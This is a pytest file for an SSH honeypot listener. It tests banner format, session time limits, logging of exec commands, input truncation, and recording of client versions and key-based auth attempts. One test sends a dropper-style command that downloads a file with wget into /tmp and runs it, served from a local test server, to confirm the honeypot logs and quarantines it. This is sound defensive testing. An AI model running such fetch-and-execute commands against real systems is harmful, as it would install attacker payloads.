"""Tests for the SSH listener (honeypot/listeners/ssh.py).

Covers the SSH-version-banner finding from the pentest review: the wire
banner must be a plausible single SSH-2.0-<implementation> string, not the
double-prefixed "SSH-2.0-SSH-2.0-..." that resulted from passing an
already-prefixed string to asyncssh's server_version (which prepends
"SSH-2.0-" itself). Also covers the unbounded-session-duration finding:
asyncssh's own login_timeout only covers the pre-auth handshake, so an
authenticated session had no maximum duration at all before
listeners.max_session_seconds was added.
"""
from __future__ import annotations

import asyncio
import json

import asyncssh

from honeypot.config.schema import CredentialPolicy, HoneypotConfig, PersonaConfig
from honeypot.listeners.ssh import start_ssh_listener
from honeypot.logging.events import EventLogger


def test_wire_banner_is_not_double_prefixed(tmp_path):
    async def run() -> bytes:
        config = HoneypotConfig(
            persona=PersonaConfig(arch="riscv64", ssh_server_id="dropbear_2020.81"),
            listeners={"bind_host": "127.0.0.1", "ssh_port": 0, "telnet_enabled": False},
            logging={"log_dir": str(tmp_path / "logs"), "transcript_dir": str(tmp_path / "transcripts")},
        )
        logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
        server = await start_ssh_listener(config, logger, host_key_path=tmp_path / "host_key")
        try:
            port = server.get_addresses()[0][1]
            reader, writer = await asyncio.open_connection("127.0.0.1", port)
            try:
                return await reader.readline()
            finally:
                writer.close()
        finally:
            server.close()

    line = asyncio.run(run())
    assert line == b"SSH-2.0-dropbear_2020.81\r\n"
    assert line.count(b"SSH-2.0-") == 1


def test_ssh_server_id_defaults_to_a_dropbear_style_string():
    persona = PersonaConfig(arch="riscv64")
    assert persona.ssh_server_id.startswith("dropbear_")


def test_authenticated_session_is_dropped_after_max_session_seconds(tmp_path):
    async def run() -> list[dict]:
        config = HoneypotConfig(
            persona=PersonaConfig(arch="riscv64"),
            credentials=CredentialPolicy(accept_any=True),
            listeners={"bind_host": "127.0.0.1", "ssh_port": 0, "telnet_enabled": False,
                       "max_session_seconds": 0.3},
            logging={"log_dir": str(tmp_path / "logs"), "transcript_dir": str(tmp_path / "transcripts")},
        )
        logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
        server = await start_ssh_listener(config, logger, host_key_path=tmp_path / "host_key")
        try:
            port = server.get_addresses()[0][1]
            async with asyncssh.connect("127.0.0.1", port=port, username="root", password="root",
                                         known_hosts=None) as conn:
                async with conn.create_process() as process:
                    # Login succeeded (asyncssh wouldn't have gotten here
                    # otherwise); now stay connected without sending
                    # anything, well past max_session_seconds, and confirm
                    # the server actually drops it rather than holding the
                    # process open indefinitely.
                    await asyncio.wait_for(process.stdout.read(), timeout=5.0)
        finally:
            server.close()
        return [json.loads(line) for line in (tmp_path / "logs" / "events.jsonl").read_text().splitlines()]

    events = asyncio.run(run())
    closed = next(e for e in events if e["event"] == "session.closed")
    assert closed["reason"] == "max_duration_exceeded"


def test_ssh_exec_requests_are_dispatched_and_logged(tmp_path):
    """`ssh host "<cmd>"` (paramiko exec_command) is how most SSH droppers
    deliver their one-liner; the listener used to ignore process.command, so
    the command was never logged and any download never attempted. Also runs
    several exec channels over one connection, as such bots do."""
    import http.server
    import threading

    serve = tmp_path / "www"
    serve.mkdir()
    (serve / "mal.bin").write_bytes(b"\x7fELF-not-really")
    handler = lambda *a, **kw: http.server.SimpleHTTPRequestHandler(*a, directory=str(serve), **kw)
    httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{httpd.server_address[1]}/mal.bin"

    async def run() -> tuple[list[str], list[dict]]:
        config = HoneypotConfig(
            persona=PersonaConfig(arch="riscv64"),
            credentials=CredentialPolicy(accept_any=True),
            listeners={"bind_host": "127.0.0.1", "ssh_port": 0, "telnet_enabled": False},
            fetcher={"quarantine_dir": str(tmp_path / "q"), "jobs_dir": str(tmp_path / "j"),
                     "block_private_networks": False},
            logging={"log_dir": str(tmp_path / "logs"), "transcript_dir": str(tmp_path / "transcripts")},
        )
        logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
        server = await start_ssh_listener(config, logger, host_key_path=tmp_path / "host_key")
        outputs: list[str] = []
        try:
            port = server.get_addresses()[0][1]
            async with asyncssh.connect("127.0.0.1", port=port, username="root", password="root",
                                         known_hosts=None) as conn:
                for cmd in ("uname -m", f"cd /tmp; wget {url} -O mal.bin; ./mal.bin"):
                    result = await asyncio.wait_for(conn.run(cmd, check=False, input=""), timeout=10)
                    outputs.append(result.stdout)
            await asyncio.sleep(0.2)
        finally:
            server.close()
        events = [json.loads(l) for l in (tmp_path / "logs" / "events.jsonl").read_text().splitlines()]
        return outputs, events

    try:
        outputs, events = asyncio.run(run())
    finally:
        httpd.shutdown()
        httpd.server_close()

    assert outputs[0] == "riscv64\n"
    assert "saved" in outputs[1]
    assert [e["outcome"] for e in events if e["event"] == "file.download"] == ["requested", "success"]
    assert len([e for e in events if e["event"] == "file.execution_attempt"]) == 1
    assert len([e for e in events if e["event"] == "session.closed"]) == 1
    assert len(list((tmp_path / "q").glob("*.bin"))) == 1


def test_oversized_ssh_exec_command_is_truncated_before_logging(tmp_path):
    """Telnet already caps lines at 8 KB; the SSH exec path had no cap, so a
    single 250 KB request wrote ~1.4 MB to the event log and transcripts."""
    from honeypot.session.manager import MAX_INPUT_CHARS

    async def run() -> tuple[str, list[dict]]:
        config = HoneypotConfig(
            persona=PersonaConfig(arch="riscv64"),
            credentials=CredentialPolicy(accept_any=True),
            listeners={"bind_host": "127.0.0.1", "ssh_port": 0, "telnet_enabled": False},
            logging={"log_dir": str(tmp_path / "logs"), "transcript_dir": str(tmp_path / "transcripts")},
        )
        logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
        server = await start_ssh_listener(config, logger, host_key_path=tmp_path / "host_key")
        try:
            port = server.get_addresses()[0][1]
            async with asyncssh.connect("127.0.0.1", port=port, username="root", password="root",
                                         known_hosts=None) as conn:
                result = await asyncio.wait_for(
                    conn.run("echo " + "A" * 250_000, check=False, input=""), timeout=10)
            await asyncio.sleep(0.2)
        finally:
            server.close()
        events = [json.loads(l) for l in (tmp_path / "logs" / "events.jsonl").read_text().splitlines()]
        return result.stdout, events

    stdout, events = asyncio.run(run())
    command_events = [e for e in events if e["event"] == "command.input"]
    assert len(command_events[0]["raw"]) == MAX_INPUT_CHARS
    assert len(stdout) <= MAX_INPUT_CHARS
    assert sum(f.stat().st_size for f in (tmp_path / "transcripts").iterdir()) < 100_000


# -- client version and non-password auth attempts -----------------------------

def _run_ssh_scenario(tmp_path, scenario, **config_kw):
    """Start the listener, run `scenario(port)`, return the logged events."""
    async def run() -> list[dict]:
        config = HoneypotConfig(
            persona=PersonaConfig(arch="riscv64"),
            credentials=CredentialPolicy(accept_any=True),
            listeners={"bind_host": "127.0.0.1", "ssh_port": 0, "telnet_enabled": False},
            logging={"log_dir": str(tmp_path / "logs"), "transcript_dir": str(tmp_path / "transcripts")},
            **config_kw,
        )
        logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
        server = await start_ssh_listener(config, logger, host_key_path=tmp_path / "host_key")
        try:
            await scenario(server.get_addresses()[0][1])
            await asyncio.sleep(0.3)
        finally:
            server.close()
        path = tmp_path / "logs" / "events.jsonl"
        return [json.loads(line) for line in path.read_text().splitlines()]
    return asyncio.run(run())


def test_client_version_is_recorded_once_for_an_authenticating_client(tmp_path):
    async def scenario(port):
        async with asyncssh.connect("127.0.0.1", port, username="root", password="root",
                                    known_hosts=None, client_keys=None, agent_path=None,
                                    client_version="libssh_0.9.6-test"):
            pass
    events = _run_ssh_scenario(tmp_path, scenario)
    versions = [e for e in events if e["event"] == "session.client_version"]
    assert [e["client_id"] for e in versions] == ["SSH-2.0-libssh_0.9.6-test"]
    assert versions[0]["session_id"] == next(e for e in events if e["event"] == "session.connect")["session_id"]
    # A normal password login is not also reported as a "none" probe.
    assert not [e for e in events if e["event"] == "auth.attempt"]


def test_client_version_is_recorded_even_if_the_client_never_authenticates(tmp_path):
    """Port scanners send a banner and hang up; that banner is still fingerprint data."""
    async def scenario(port):
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        await reader.readline()
        writer.write(b"SSH-2.0-Go\r\n")
        await writer.drain()
        writer.close()
    events = _run_ssh_scenario(tmp_path, scenario)
    assert [e["client_id"] for e in events if e["event"] == "session.client_version"] == ["SSH-2.0-Go"]


def test_public_key_attempts_are_logged_with_fingerprints_and_refused(tmp_path):
    key = asyncssh.generate_private_key("ssh-ed25519")
    other = asyncssh.generate_private_key("ssh-ed25519")

    async def scenario(port):
        try:
            await asyncssh.connect("127.0.0.1", port, username="deploy", client_keys=[key, other],
                                   password=None, known_hosts=None, agent_path=None, preferred_auth="publickey")
        except asyncssh.PermissionDenied:
            pass
    events = _run_ssh_scenario(tmp_path, scenario)
    attempts = [e for e in events if e["event"] == "auth.attempt"]
    assert {a["method"] for a in attempts} == {"publickey"}
    assert {a["key_fingerprint"] for a in attempts} == {
        key.convert_to_public().get_fingerprint(), other.convert_to_public().get_fingerprint()}
    assert all(a["username"] == "deploy" and a["key_type"] == "ssh-ed25519" and a["src_ip"] for a in attempts)
    assert not [e for e in events if e["event"] == "login.success"]


def test_a_client_that_asks_for_auth_but_offers_nothing_is_logged_as_a_none_probe(tmp_path):
    async def scenario(port):
        try:
            await asyncssh.connect("127.0.0.1", port, username="pi", client_keys=None, password=None,
                                   known_hosts=None, agent_path=None, kbdint_auth=False, gss_auth=False)
        except asyncssh.PermissionDenied:
            pass
    events = _run_ssh_scenario(tmp_path, scenario)
    attempts = [e for e in events if e["event"] == "auth.attempt"]
    assert len(attempts) == 1 and attempts[0]["method"] == "none" and attempts[0]["username"] == "pi"
    # ...and it lands before the session is closed.
    names = [e["event"] for e in events]
    assert names.index("auth.attempt") < names.index("session.closed")


def test_logged_public_keys_are_capped_per_connection(tmp_path):
    from honeypot.listeners.ssh import _MAX_LOGGED_KEYS
    keys = [asyncssh.generate_private_key("ssh-ed25519") for _ in range(_MAX_LOGGED_KEYS + 15)]

    async def scenario(port):
        try:
            await asyncssh.connect("127.0.0.1", port, username="root", client_keys=keys, password=None,
                                   known_hosts=None, agent_path=None, preferred_auth="publickey")
        except asyncssh.PermissionDenied:
            pass
    events = _run_ssh_scenario(tmp_path, scenario)
    assert len([e for e in events if e["event"] == "auth.attempt"]) == _MAX_LOGGED_KEYS


def test_client_with_a_key_and_a_password_still_logs_in_with_the_password(tmp_path):
    """Advertising publickey must not break the common case: the key is refused
    (and logged), then the client falls back to its password."""
    key = asyncssh.generate_private_key("ssh-ed25519")

    async def scenario(port):
        async with asyncssh.connect("127.0.0.1", port, username="root", password="root",
                                    client_keys=[key], known_hosts=None, agent_path=None):
            pass
    events = _run_ssh_scenario(tmp_path, scenario)
    assert [e["method"] for e in events if e["event"] == "auth.attempt"] == ["publickey"]
    assert len([e for e in events if e["event"] == "login.success"]) == 1
